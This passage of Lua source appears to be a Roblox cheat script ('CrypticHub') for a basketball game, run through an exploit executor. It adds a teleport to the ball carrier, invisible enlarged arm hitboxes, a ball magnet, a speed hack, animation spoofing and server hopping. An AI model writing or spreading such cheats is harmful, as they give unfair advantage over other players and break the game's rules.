        if ballCarrier and ballCarrierRoot then
            local maxDistance = isPark and 100 or math.huge
            local dist = (hrp.Position - ballCarrierRoot.Position).Magnitude
            
            if dist <= maxDistance then
                hrp.CFrame = ballCarrierRoot.CFrame * CFrame.new(0, 0, followOffset)
            end
        end
    end)
end

local function disableFollowBallCarrier()
    if not followEnabled then return end
    followEnabled = false
    
    if followConnection then
        followConnection:Disconnect()
        followConnection = nil
    end
end

FollowBallCarrierGroup:AddToggle("FollowBallCarrier", {
    Text = "Follow Ball Carrier",
    Default = false,
    Tooltip = "Instantly teleports you to whoever has the ball",
    Callback = function(value)
        if value then
            enableFollowBallCarrier()
        else
            disableFollowBallCarrier()
        end
    end
}):AddKeyPicker("FollowBallCarrierKey", {
    Default = "H",
    SyncToggleState = true,
    Mode = "Toggle",
    Text = "Follow Ball Carrier Key",
    Callback = function(active)
        FollowBallCarrierGroup:SetToggle("FollowBallCarrier", active)
    end
})

FollowBallCarrierGroup:AddSlider("FollowOffset", {
    Text = "Follow Offset",
    Default = -10,
    Min = -10,
    Max = 10,
    Rounding = 0,
    Tooltip = "Distance in front of the ball carrier",
    Callback = function(value)
        followOffset = value
    end
})

local stealReachEnabled = false
local stealReachMultiplier = 3
local originalRightArmSize = nil
local originalLeftArmSize = nil
local armConnection = nil

local MagsDist = 30
local magnetEnabled = false
local magnetConnection = nil

local stealReachEnabled = false
local stealReachMultiplier = 3
local originalRightArmSize = nil
local originalLeftArmSize = nil
local armConnection = nil

local stealReachEnabled = false
local stealReachMultiplier = 3
local originalRightArmSize = nil
local originalLeftArmSize = nil
local armConnection = nil
local StealGroup = Tabs.Main:AddRightGroupbox("Steal Reach", "hand")

local function updateHitboxSizes()
    local char = player.Character
    if not char then return end
    
    local rightArm = char:FindFirstChild("Right Arm") or char:FindFirstChild("RightHand") or char:FindFirstChild("RightLowerArm")
    local leftArm = char:FindFirstChild("Left Arm") or char:FindFirstChild("LeftHand") or char:FindFirstChild("LeftLowerArm")
    
    if stealReachEnabled then
        -- Right Arm - cube hitbox
        if rightArm then
            if not originalRightArmSize then
                originalRightArmSize = rightArm.Size
            end
            rightArm.Size = Vector3.new(
                originalRightArmSize.X * stealReachMultiplier,
                originalRightArmSize.Y * stealReachMultiplier,
                originalRightArmSize.Z * stealReachMultiplier
            )
            rightArm.Transparency = 1
            rightArm.CanCollide = false 
            rightArm.Massless = true 
        end
        
        -- Left Arm - cube hitbox
        if leftArm then
            if not originalLeftArmSize then
                originalLeftArmSize = leftArm.Size
            end
            leftArm.Size = Vector3.new(
                originalLeftArmSize.X * stealReachMultiplier,
                originalLeftArmSize.Y * stealReachMultiplier,
                originalLeftArmSize.Z * stealReachMultiplier
            )
            leftArm.Transparency = 1
            leftArm.CanCollide = false 
            leftArm.Massless = true 
        end
    else
        -- Reset Right Arm
        if rightArm and originalRightArmSize then
            rightArm.Size = originalRightArmSize
            rightArm.Transparency = 0
            rightArm.CanCollide = false
            rightArm.Massless = false
            originalRightArmSize = nil
        end
        
        -- Reset Left Arm
        if leftArm and originalLeftArmSize then
            leftArm.Size = originalLeftArmSize
            leftArm.Transparency = 0
            leftArm.CanCollide = false
            leftArm.Massless = false
            originalLeftArmSize = nil
        end
    end
end

StealGroup:AddToggle("StealReach", {
    Text = "Steal Reach",
    Default = false,
    Tooltip = "Expands both arms for easier steals.",
    Callback = function(value)
        stealReachEnabled = value
        updateHitboxSizes()
        
        if value then
            if not armConnection then
                armConnection = player.CharacterAdded:Connect(function()
                    task.wait(1)
                    originalRightArmSize = nil
                    originalLeftArmSize = nil
                    updateHitboxSizes()
                end)
            end
        else
            if armConnection then
                armConnection:Disconnect()
                armConnection = nil
            end
        end
    end
})

StealGroup:AddSlider("StealMultiplier", {
    Text = "Reach Multiplier",
    Default = 3,
    Min = 1,
    Max = 25,
    Rounding = 1,
    Compact = false,
    Callback = function(value)
        stealReachMultiplier = value
        if stealReachEnabled then
            updateHitboxSizes()
        end
    end
})

local BallMagnetGroup = Tabs.Main:AddRightGroupbox("Ball Magnet")

BallMagnetGroup:AddToggle("BallMagnet", {
    Text = "Ball Magnet",
    Default = false,
    Tooltip = "Automatically magnets you to the basketball",
    Callback = function(value)
        magnetEnabled = value
        if not value and magnetConnection then
            magnetConnection:Disconnect()
            magnetConnection = nil
        end
    end
}):AddKeyPicker("BallMagnetKey", {
    Default = "M",
    SyncToggleState = true,
    Mode = "Toggle",
    Text = "Ball Magnet Key",
    Callback = function(active)
        BallMagnetGroup:SetToggle("BallMagnet", active)
    end
})

BallMagnetGroup:AddSlider("BallMagnetDistance", {
    Text = "Magnet Distance",
    Default = 30,
    Min = 10,
    Max = 85,
    Rounding = 0,
    Tooltip = "Maximum distance to magnet from",
    Callback = function(value)
        MagsDist = value
    end
})

magnetConnection = RunService.Heartbeat:Connect(function()
    if not magnetEnabled then return end
    
    local char = player.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    
    -- Check for loose ball (BasePart in workspace)
    local looseBall = workspace:FindFirstChild("Basketball")
    if looseBall and looseBall:IsA("BasePart") then
        local dist = (hrp.Position - looseBall.Position).Magnitude
        if dist <= MagsDist then
            local touch = looseBall:FindFirstChildOfClass("TouchTransmitter")
            if not touch then
                for _, d in ipairs(looseBall:GetDescendants()) do
                    if d:IsA("TouchTransmitter") then
                        touch = d
                        break
                    end
                end
            end
            if touch then
                firetouchinterest(hrp, looseBall, 0)
                firetouchinterest(hrp, looseBall, 1)
            end
        end
    else
        -- Check for ball equipped by other players (Tool)
        for _, model in pairs(workspace:GetChildren()) do
            if model:IsA("Model") and model ~= char and model:FindFirstChild("HumanoidRootPart") then
                local tool = model:FindFirstChild("Basketball")
                if tool and tool:IsA("Tool") then
                    local handle = tool:FindFirstChild("Handle") or tool:FindFirstChildWhichIsA("BasePart")
                    if handle then
                        local dist = (hrp.Position - handle.Position).Magnitude
                        if dist <= MagsDist then
                            local touch = handle:FindFirstChildOfClass("TouchTransmitter")
                            if not touch then
                                for _, d in ipairs(handle:GetDescendants()) do
                                    if d:IsA("TouchTransmitter") then
                                        touch = d
                                        break
                                    end
                                end
                            end
                            if touch then
                                firetouchinterest(hrp, handle, 0)
                                firetouchinterest(hrp, handle, 1)
                            end
                        end
                    end
                end
            end
        end
    end
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if input.KeyCode == Enum.KeyCode.G and not gameProcessed then
        if autoGuardToggleEnabled then
            holdingG = true
            autoGuardEnabled = true
            lastPositions = {}
            if not autoGuardConnection then
                autoGuardConnection = RunService.Heartbeat:Connect(autoGuard)
            end
        end
    end
end)

UserInputService.InputEnded:Connect(function(input, gameProcessed)
    if input.KeyCode == Enum.KeyCode.G then
        holdingG = false
        autoGuardEnabled = false
        
        if autoGuardConnection then
            autoGuardConnection:Disconnect()
            autoGuardConnection = nil
        end
        
        lastPositions = {}
        
        local VirtualInputManager = game:GetService("VirtualInputManager")
        VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.F, false, game)
    end
end)

GuardGroup:AddLabel("Hold G to activate auto guard\n(toggle must be enabled)", true)

GuardGroup:AddSlider("GuardDistance", {
    Text = "Guard Distance",
    Default = 10,
    Min = 5,
    Max = 20,
    Rounding = 0,
    Tooltip = "Maximum distance to start guarding",
    Callback = function(value)
        guardDistance = value
    end
})

GuardGroup:AddSlider("PredictionTime", {
    Text = "Prediction Time",
    Default = 0.3,
    Min = 0.1,
    Max = 0.8,
    Rounding = 1,
    Tooltip = "How far ahead to predict opponent movement (seconds)",
    Callback = function(value)
        predictionTime = value
    end
})

GuardGroup:AddLabel("Auto Guard will predict opponent\nmovement and position defensively\nin front of them while holding F.", true)

local function startCFrameSpeed(speed)
    local connection
    connection = RunService.RenderStepped:Connect(function(deltaTime)
        local character = player.Character
        if not character then return end
        local root = character:FindFirstChild("HumanoidRootPart")
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not root or not humanoid then return end

        local moveVec = humanoid.MoveDirection
        if moveVec.Magnitude > 0 then
            local speedDelta = math.max(speed - humanoid.WalkSpeed, 0)
            root.CFrame = root.CFrame + (moveVec.Unit * speedDelta * deltaTime)
        end
    end)
    return function()
        if connection then
            connection:Disconnect()
        end
    end
end

SpeedGroup:AddToggle("SpeedBoost", {
    Text = "Speed Boost",
    Default = false,
    Tooltip = "Enable or disable speed boost (CFrame method)",
    Callback = function(value)
        speedBoostEnabled = value
        if value then
            if speedBoostConnection then speedBoostConnection() end
            speedBoostConnection = startCFrameSpeed(desiredSpeed)
        else
            if speedBoostConnection then speedBoostConnection() end
            speedBoostConnection = nil
        end
    end
})

SpeedGroup:AddSlider("SpeedAmount", {
    Text = "Speed Amount",
    Default = 16,
    Min = 16,
    Max = 23,
    Rounding = 1,
    Tooltip = "Adjust the speed boost amount",
    Callback = function(value)
        desiredSpeed = value
        if speedBoostEnabled then
            if speedBoostConnection then speedBoostConnection() end
            speedBoostConnection = startCFrameSpeed(desiredSpeed)
        end
    end
})

local function setBGVisibleToTrue()
    for _, model in pairs(workspace:GetChildren()) do
        if model:IsA("Model") and model:FindFirstChild("HumanoidRootPart") then
            local humanoidRootPart = model.HumanoidRootPart
            for _, obj in pairs(humanoidRootPart:GetDescendants()) do
                if obj.Name == "BG" and obj:IsA("BodyGyro") then
                    obj.Parent = humanoidRootPart
                    obj.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
                    obj.P = 9e4
                    obj.D = 500
                    obj.CFrame = humanoidRootPart.CFrame
                end
            end
        end
    end
end

local function hideBG()
    for _, model in pairs(workspace:GetChildren()) do
        if model:IsA("Model") and model:FindFirstChild("HumanoidRootPart") then
            local humanoidRootPart = model.HumanoidRootPart
            for _, obj in pairs(humanoidRootPart:GetDescendants()) do
                if obj.Name == "BG" and obj:IsA("BodyGyro") then
                    obj.Parent = nil
                end
            end
        end
    end
end

MiscGroup:AddToggle("ShowBG", {
    Text = "Show BodyGyro",
    Default = false,
    Tooltip = "Makes BodyGyro visible for all players",
    Callback = function(value)
        if value then
            setBGVisibleToTrue()
        else
            hideBG()
        end
    end
})

local AnimationsFolder = ReplicatedStorage:WaitForChild("Assets"):WaitForChild("Animations_R15")
local selectedDunkAnim = "Default"
local selectedEmoteAnim = "Dance_Casual"
local animationSpoofEnabled = false
local dunkSpoofConnection = nil
local emoteSpoofConnection = nil
local charAddedConnDunk = nil
local charAddedConnEmote = nil

local EmoteAnimations = {
    Default = "Dance_Casual",
    Dance_Sturdy = "Dance_Sturdy",
    Dance_Taunt = "Dance_Taunt",
    Dance_TakeFlight = "Dance_TakeFlight",
    Dance_Flex = "Dance_Flex",
    Dance_Bat = "Dance_Bat",
    Dance_Twist = "Dance_Twist",
    Dance_Griddy = "Dance_Griddy",
    Dance_Dab = "Dance_Dab",
    Dance_Drake = "Dance_Drake",
    Dance_Fresh = "Dance_Fresh",
    Dance_Hype = "Dance_Hype",
    Dance_Spongebob = "Dance_Spongebob",
    Dance_Backflip = "Dance_Backflip",
    Dance_L = "Dance_L",
    Dance_Facepalm = "Dance_Facepalm",
    Dance_Bow = "Dance_Bow"
}

local emoteOptions = {}
for key, _ in pairs(EmoteAnimations) do
    table.insert(emoteOptions, key)
end
table.sort(emoteOptions)

local function setupDunkSpoof(humanoid)
    local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)
    return animator.AnimationPlayed:Connect(function(track)
        if animationSpoofEnabled and track.Animation.Name == "Dunk_Default" and selectedDunkAnim ~= "Default" then
            track:Stop()
            local customAnim = AnimationsFolder:FindFirstChild("Dunk_" .. selectedDunkAnim)
            if customAnim then
                humanoid:LoadAnimation(customAnim):Play()
            end
        end
    end)
end

local function setupEmoteSpoof(humanoid)
    local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)
    return animator.AnimationPlayed:Connect(function(track)
        if animationSpoofEnabled and track.Animation.Name == "Dance_Casual" and selectedEmoteAnim ~= "Dance_Casual" then
            track:Stop()
            local customAnim = AnimationsFolder:FindFirstChild(selectedEmoteAnim)
            if customAnim then
                humanoid:LoadAnimation(customAnim):Play()
            end
        end
    end)
end

local function enableAnimationSpoof()
    local char = player.Character
    if char then
        local humanoid = char:FindFirstChildOfClass("Humanoid")
        if humanoid then
            if dunkSpoofConnection then dunkSpoofConnection:Disconnect() end
            if emoteSpoofConnection then emoteSpoofConnection:Disconnect() end
            dunkSpoofConnection = setupDunkSpoof(humanoid)
            emoteSpoofConnection = setupEmoteSpoof(humanoid)
        end
    end

    if charAddedConnDunk then charAddedConnDunk:Disconnect() end
    if charAddedConnEmote then charAddedConnEmote:Disconnect() end

    charAddedConnDunk = player.CharacterAdded:Connect(function(newChar)
        local humanoid = newChar:WaitForChild("Humanoid")
        if dunkSpoofConnection then dunkSpoofConnection:Disconnect() end
        dunkSpoofConnection = setupDunkSpoof(humanoid)
    end)

    charAddedConnEmote = player.CharacterAdded:Connect(function(newChar)
        local humanoid = newChar:WaitForChild("Humanoid")
        if emoteSpoofConnection then emoteSpoofConnection:Disconnect() end
        emoteSpoofConnection = setupEmoteSpoof(humanoid)
    end)
end

local function disableAnimationSpoof()
    if dunkSpoofConnection then
        dunkSpoofConnection:Disconnect()
        dunkSpoofConnection = nil
    end
    if emoteSpoofConnection then
        emoteSpoofConnection:Disconnect()
        emoteSpoofConnection = nil
    end
    if charAddedConnDunk then
        charAddedConnDunk:Disconnect()
        charAddedConnDunk = nil
    end
    if charAddedConnEmote then
        charAddedConnEmote:Disconnect()
        charAddedConnEmote = nil
    end
end

AnimationGroup:AddToggle("AnimationSpoof", {
    Text = "Animation Changer",
    Default = false,
    Tooltip = "Enable animation spoofing for dunks and emotes",
    Callback = function(value)
        animationSpoofEnabled = value
        if value then
            enableAnimationSpoof()
        else
            disableAnimationSpoof()
        end
    end
})

AnimationGroup:AddDropdown("DunkSpoof", {
    Values = {"Default", "Testing", "Testing2", "Reverse", "360", "Testing3", "Tomahawk", "Windmill"},
    Default = 1,
    Multi = false,
    Text = "Dunk Animation",
    Tooltip = "Change your dunk animation",
    Callback = function(value)
        selectedDunkAnim = value
    end
})

AnimationGroup:AddDropdown("EmoteSpoof", {
    Values = emoteOptions,
    Default = 1,
    Multi = false,
    Text = "Emote Animation",
    Tooltip = "Change your emote/dance animation",
    Callback = function(value)
        selectedEmoteAnim = EmoteAnimations[value]
    end
})

local Http = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or (request) or (http_request)

local placesList = {}
local loadingPlaces = false

local TeleporterGroup = Tabs.Misc:AddLeftGroupbox("Teleporter", "navigation")

local PlaceDropdown = TeleporterGroup:AddDropdown("TeleportPlace", {
    Values = {"Loading places..."},
    Default = 1,
    Multi = false,
    Text = "Select Place",
    Tooltip = "Choose a place to teleport to"
})

local function loadPlaces()
    if loadingPlaces then return end
    loadingPlaces = true
    
    if not Http then
        PlaceDropdown:SetValues({"Current Place"})
        placesList["Current Place"] = game.PlaceId
        loadingPlaces = false
        return
    end
    
    local universeId = game.GameId
    local url = "https://develop.roblox.com/v1/universes/" .. universeId .. "/places?limit=100"
    
    local success, response = pcall(function()
        return Http({
            Url = url,
            Method = "GET",
            Headers = {
                ["User-Agent"] = "Roblox/WinInet",
                ["Content-Type"] = "application/json"
            }
        })
    end)
    
    if success and response and response.Body then
        local decodeSuccess, data = pcall(function()
            return HttpService:JSONDecode(response.Body)
        end)
        
        if decodeSuccess and data and data.data then
            for _, place in ipairs(data.data) do
                if place.name and place.id then
                    local displayName = place.name
                    if place.isRootPlace then
                        displayName = displayName .. " (Root)"
                    end
                    placesList[displayName] = place.id
                end
            end
        end
    end
    
    local placeNames = {}
    for name, _ in pairs(placesList) do
        table.insert(placeNames, name)
    end
    table.sort(placeNames)
    
    if #placeNames > 0 then
        PlaceDropdown:SetValues(placeNames)
        PlaceDropdown:SetValue(placeNames[1])
    else
        PlaceDropdown:SetValues({"Current Place"})
        placesList["Current Place"] = game.PlaceId
    end
    
    loadingPlaces = false
end

task.spawn(loadPlaces)

TeleporterGroup:AddButton({
    Text = "Teleport",
    Func = function()
        local selected = Options.TeleportPlace.Value
        local placeId = placesList[selected]
        
        if placeId then
            Library:Notify({
                Title = "Teleporting",
                Description = "Teleporting to " .. selected .. "...",
                Time = 3,
            })
            
            TeleportService:Teleport(placeId)
        end
    end,
    Tooltip = "Teleport to selected place"
})

TeleporterGroup:AddButton({
    Text = "Rejoin Current Server",
    Func = function()
        Library:Notify({
            Title = "Rejoining",
            Description = "Rejoining current server...",
            Time = 3,
        })
        
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
    end,
    Tooltip = "Rejoin your current server"
})

TeleporterGroup:AddButton({
    Text = "Server Hop",
    Func = function()
        Library:Notify({
            Title = "Server Hopping",
            Description = "Finding best server...",
            Time = 3,
        })
        
        local servers = {}
        local cursor = ""
        
        repeat
            local url = "https://games.roblox.com/v1/games/" .. tostring(game.PlaceId) .. "/servers/Public?sortOrder=Asc&limit=100&cursor=" .. cursor
            
            local success, result = pcall(function()
                return game:HttpGet(url)
            end)
            
            if success then
                local decoded = HttpService:JSONDecode(result)
                cursor = decoded.nextPageCursor or ""
                
                for _, server in pairs(decoded.data) do
                    if server.playing < server.maxPlayers and server.id ~= game.JobId then
                        table.insert(servers, server)
                    end
                end
            else
                break
            end
        until cursor == ""
        
        if #servers > 0 then
            table.sort(servers, function(a, b)
                return a.playing < b.playing
            end)
            
            TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[1].id, player)
        else
            Library:Notify({
                Title = "Server Hop Failed",
                Description = "No available servers found",
                Time = 3,
            })
        end
    end,
    Tooltip = "Join the server with the least players"
})

local function setBGVisibleToTrue()
    for _, model in pairs(workspace:GetChildren()) do
        if model:IsA("Model") and model:FindFirstChild("HumanoidRootPart") then
            local humanoidRootPart = model.HumanoidRootPart
            for _, obj in pairs(humanoidRootPart:GetDescendants()) do
                if obj:IsA("BillboardGui") and obj.Name == "Info" then
                    for _, frame in pairs(obj:GetDescendants()) do
                        if frame:IsA("Frame") and frame.Name == "BG" then
                            frame.Visible = true
                        end
                    end
                end
            end
        end
    end
end

local function setBGVisibleToFalse()
    for _, model in pairs(workspace:GetChildren()) do
        if model:IsA("Model") and model:FindFirstChild("HumanoidRootPart") then
            local humanoidRootPart = model.HumanoidRootPart
            for _, obj in pairs(humanoidRootPart:GetDescendants()) do
                if obj:IsA("BillboardGui") and obj.Name == "Info" then
                    for _, frame in pairs(obj:GetDescendants()) do
                        if frame:IsA("Frame") and frame.Name == "BG" then
                            frame.Visible = false
                        end
                    end
                end
            end
        end
    end
end

MiscGroup:AddToggle("ShowRecords", {
    Text = "Show all Records/Streaks",
    Default = false,
    Tooltip = "Unhide all records and streaks",
    Callback = function(value)
        if value then
            setBGVisibleToTrue()
        else
            setBGVisibleToFalse()
        end
    end
})

MenuGroup:AddToggle("KeybindMenuOpen", {
    Default = Library.KeybindFrame.Visible,
    Text = "Open Keybind Menu",
    Callback = function(value)
        Library.KeybindFrame.Visible = value
    end,
})

MenuGroup:AddToggle("ShowCustomCursor", {
    Text = "Custom Cursor",
    Default = false,
    Callback = function(Value)
        Library.ShowCustomCursor = Value
    end,
})

MenuGroup:AddDropdown("NotificationSide", {
    Values = { "Left", "Right" },
    Default = "Right",
    Text = "Notification Side",
    Callback = function(Value)
        Library:SetNotifySide(Value)
    end,
})

MenuGroup:AddDropdown("DPIDropdown", {
    Values = { "50%", "75%", "100%", "125%", "150%", "175%", "200%" },
    Default = "100%",
    Text = "DPI Scale",
    Callback = function(Value)
        Value = Value:gsub("%%", "")
        local DPI = tonumber(Value)
        Library:SetDPIScale(DPI)
    end,
})

MenuGroup:AddDivider()

MenuGroup:AddLabel("Menu bind"):AddKeyPicker("MenuKeybind", { 
    Default = "LeftControl", 
    NoUI = true, 
    Text = "Menu keybind" 
})

MenuGroup:AddButton("Unload", function()
    Library:Unload()
end)

Library.ToggleKeybind = Options.MenuKeybind

MenuGroup:AddDivider()
MenuGroup:AddLabel("ThemeManager", true)
MenuGroup:AddLabel("SaveManager", true)

ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)

SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({ "MenuKeybind" })

ThemeManager:SetFolder("CrypticHub")
SaveManager:SetFolder("CrypticHub/configs")

SaveManager:BuildConfigSection(Tabs["UI Settings"])
ThemeManager:ApplyToTab(Tabs["UI Settings"])

SaveManager:LoadAutoloadConfig()

Library:OnUnload(function()
    Library.Unloaded = true
    if visibleConn then
        visibleConn:Disconnect()
    end
    if autoGuardConnection then
        autoGuardConnection:Disconnect()
    end
    if speedBoostConnection then
        speedBoostConnection()
    end
    if magnetConnection then
        magnetConnection:Disconnect()
    end
    disableAnimationSpoof()
end)
